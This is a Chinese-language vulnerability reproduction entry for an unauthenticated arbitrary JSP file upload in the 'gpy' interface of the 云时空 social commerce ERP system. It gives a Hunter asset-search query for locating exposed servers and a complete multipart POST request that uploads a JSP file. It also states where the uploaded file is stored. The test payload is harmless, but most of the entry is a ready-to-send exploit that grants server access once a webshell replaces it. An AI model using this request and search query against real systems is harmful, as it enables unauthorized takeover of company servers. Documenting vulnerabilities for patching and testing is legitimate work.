# 云时空社会化商业ERP系统gpy任意文件上传漏洞

# 一、漏洞简介
云时空社会化商业ERP以大型集团供应链系统为支撑，是基于互联网技术的多渠道模式营销服务管理体系，可以帮助您整合线上和线下交易模式，覆盖企业经营管理应用各个方面。云时空社会化商业ERP系统gpy接口存在任意文件上传漏洞，未经身份认证的攻击者可通过该漏洞在服务器端上传jsp文件获取服务器权限。

# <font style="color:rgb(44, 62, 80);">二、影响版本</font>
+ 云时空社会化商业ERP

# 三、资产测绘
+ hunter`web.body="/static/plugin/lhgdialog/skins/default.css"`
+ 特征

![1702439672374-9b6516a4-c8a6-42cb-bf3b-f8a1c131cfac.png](./img/xZS8jyBZUVBke0PW/1702439672374-9b6516a4-c8a6-42cb-bf3b-f8a1c131cfac-190091.png)

# 四、漏洞复现
```plain
POST /servlet/fileupload/gpy HTTP/1.1
Host: {hostname}
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: multipart/form-data; boundary=4eea98d02AEa93f60ea08dE3C18A1388
Content-Length: 221

--4eea98d02AEa93f60ea08dE3C18A1388
Content-Disposition: form-data; name="file1"; filename="stc.jsp"
Content-Type: application/octet-stream

<% out.println("123"); %>
--4eea98d02AEa93f60ea08dE3C18A1388--
```

![1702439757315-188d99c7-9bec-4457-8fbd-56f8f6b42b23.png](./img/xZS8jyBZUVBke0PW/1702439757315-188d99c7-9bec-4457-8fbd-56f8f6b42b23-779513.png)

上传文件位置

2023-12-13，为响应时间

```plain
/uploads/pics/2023-12-13/stc.jsp
```

![1702439815849-f9b8b51c-ae4f-4253-82f5-779b0146cb6d.png](./img/xZS8jyBZUVBke0PW/1702439815849-f9b8b51c-ae4f-4253-82f5-779b0146cb6d-890051.png)



> 更新: 2024-02-29 23:55:43  
> 原文: <https://www.yuque.com/xiaokp7/ocvun2/gisby3trr2tide3u>